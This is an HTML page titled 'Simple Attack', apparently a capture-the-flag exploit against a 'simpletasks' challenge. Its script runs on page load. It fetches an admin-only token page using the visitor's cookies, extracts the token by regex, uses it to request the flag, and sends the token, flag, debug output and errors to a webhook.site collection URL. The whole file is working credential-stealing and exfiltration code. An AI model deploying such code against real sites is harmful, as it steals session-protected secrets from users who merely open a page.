<!DOCTYPE html>
<html>
<head>
    <title>Simple Attack</title>
</head>
<body>
    <script>
        // 發送開始信號
        fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?step=start').catch(() => {});
        
        // 等待admin登入
        setTimeout(() => {
            // 直接嘗試獲取admin的token頁面
            fetch('http://http://ay1sqnpo2s0kb38nl1zksw6ypbi8t9.simpletasks.web.jctf.pro/tasks/preview/0/0', {
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                // 檢查是否包含justToken
                if (data.includes('justToken{')) {
                    const match = data.match(/justToken\{([^}]+)\}/);
                    if (match) {
                        const token = match[1];
                        // 發送token
                        fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + token)
                            .catch(() => {});
                        
                        // 嘗試獲取flag
                        fetch('http://http://ay1sqnpo2s0kb38nl1zksw6ypbi8t9.simpletasks.web.jctf.pro/token?token=' + token)
                            .then(r => r.text())
                            .then(flag => {
                                fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?flag=' + encodeURIComponent(flag))
                                    .catch(() => {});
                            })
                            .catch(() => {});
                    }
                } else {
                    // 發送調試信息
                    fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?debug=' + encodeURIComponent(data.substring(0, 100)))
                        .catch(() => {});
                }
            })
            .catch(error => {
                fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?error=' + encodeURIComponent(error.message))
                    .catch(() => {});
            });
        }, 2000);
    </script>
</body>
</html>
